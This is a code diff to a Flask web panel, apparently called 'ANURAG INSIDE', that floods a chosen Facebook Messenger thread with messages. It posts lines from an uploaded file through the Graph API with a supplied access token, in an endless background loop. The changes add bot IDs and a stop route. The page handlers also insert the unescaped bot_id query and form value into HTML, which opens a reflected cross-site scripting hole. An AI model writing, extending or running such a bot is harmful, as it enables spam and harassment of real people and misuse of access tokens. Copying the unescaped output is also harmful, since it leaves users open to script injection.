@@ -2,9 +2,13 @@ from flask import Flask, request, redirect, url_for
 import requests
 import time
 import threading
+import uuid
 
 app = Flask(__name__)
 app.debug = True
+
+# ✅ Active bots ka dict
+bots = {}
 
 headers = {
     'Connection': 'keep-alive',
@@ -28,28 +32,34 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        def start_bot():
-            while True:
+        # ✅ Unique bot id
+        bot_id = str(uuid.uuid4())
+        bots[bot_id] = {"running": True}
+
+        def start_bot(bot_id):
+            while bots.get(bot_id, {}).get("running", False):
                 try:
                     for message1 in messages:
+                        if not bots[bot_id]["running"]:
+                            break
                         api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                         message = str(mn) + ' ' + message1
                         parameters = {'access_token': access_token, 'message': message}
                         response = requests.post(api_url, data=parameters, headers=headers)
                         if response.status_code == 200:
-                            print(f"✅ Sent → {message}")
+                            print(f"[{bot_id}] ✅ Sent → {message}")
                         else:
-                            print(f"❌ Failed → {message}")
+                            print(f"[{bot_id}] ❌ Failed → {message}")
                         time.sleep(time_interval)
                 except Exception as e:
-                    print(f"⚠ Error while sending → {message}")
+                    print(f"[{bot_id}] ⚠ Error while sending → {message}")
                     print(e)
                     time.sleep(30)
 
-        threading.Thread(target=start_bot, daemon=True).start()
+        threading.Thread(target=start_bot, args=(bot_id,), daemon=True).start()
 
-        # ✅ Form submit ke baad success page par bhej do
-        return redirect(url_for('success'))
+        # ✅ Redirect with bot_id in URL
+        return redirect(url_for('success', bot_id=bot_id))
 
     return """<!DOCTYPE html>
 <html lang="en">
@@ -170,6 +180,16 @@ def send_message():
       </div>
       <button type="submit" class="btn btn-submit">🚀 START ANURAG INSIDE</button>
     </form>
+
+    <!-- ✅ Stop bot form -->
+    <hr style="border-color:white; margin:20px 0;">
+    <form action="/stop" method="post">
+      <div class="mb-3">
+        <label for="botId">Enter Bot ID to Stop:</label>
+        <input type="text" class="form-control" id="botId" name="botId" required>
+      </div>
+      <button type="submit" class="btn btn-submit" style="background:linear-gradient(90deg,#ff0000,#ff7300);">🛑 STOP BOT</button>
+    </form>
   </div>
 
   <footer class="footer">
@@ -182,14 +202,15 @@ def send_message():
 # ✅ Success Page
 @app.route('/success')
 def success():
-    return """
+    bot_id = request.args.get("bot_id", "UNKNOWN")
+    return f"""
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <title>Bot Started ✅</title>
       <style>
-        body {
+        body {{
           font-family: Arial, sans-serif;
           background: linear-gradient(135deg,#00b09b,#96c93d);
           color: white;
@@ -199,10 +220,10 @@ def success():
           justify-content: center;
           align-items: center;
           flex-direction: column;
-        }
-        h1 { font-size: 2.5rem; }
-        p { font-size: 1.2rem; }
-        .btn {
+        }}
+        h1 {{ font-size: 2.5rem; }}
+        p {{ font-size: 1.2rem; }}
+        .btn {{
           margin-top: 20px;
           text-decoration: none;
           background: white;
@@ -210,16 +231,33 @@ def success():
           padding: 12px 25px;
           border-radius: 30px;
           font-weight: bold;
-        }
+        }}
+        code {{
+          background: #fff;
+          color: #333;
+          padding: 5px 10px;
+          border-radius: 5px;
+        }}
       </style>
     </head>
     <body>
       <h1>✅ Bot Started Successfully!</h1>
       <p>Your bot is running in the background.</p>
+      <p>🆔 Bot ID: <code>{bot_id}</code></p>
       <a href="/" class="btn">⬅ Back to Panel</a>
     </body>
     </html>
     """
+
+# ✅ Stop bot route
+@app.route('/stop', methods=['POST'])
+def stop_bot():
+    bot_id = request.form.get("botId")
+    if bot_id in bots:
+        bots[bot_id]["running"] = False
+        return f"<h2>🛑 Bot {bot_id} Stopped Successfully!</h2><a href='/'>⬅ Back</a>"
+    else:
+        return f"<h2>⚠ Bot ID {bot_id} Not Found!</h2><a href='/'>⬅ Back</a>"
 
 if __name__ == '__main__':
     print("⎯⎯⎯⎯⎯⎯⎯⎯⚡ ANURAG INSIDE ⚡⎯⎯⎯⎯⎯⎯⎯⎯")
@@ -227,4 +265,3 @@ if __name__ == '__main__':
     print("🔥 PANEL POWERED BY ANURAG INSIDE 🔥")
     print("⎯⎯⎯⎯⎯⎯⎯⎯⚡ SYSTEM ONLINE ⚡⎯⎯⎯⎯⎯⎯⎯⎯")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
-
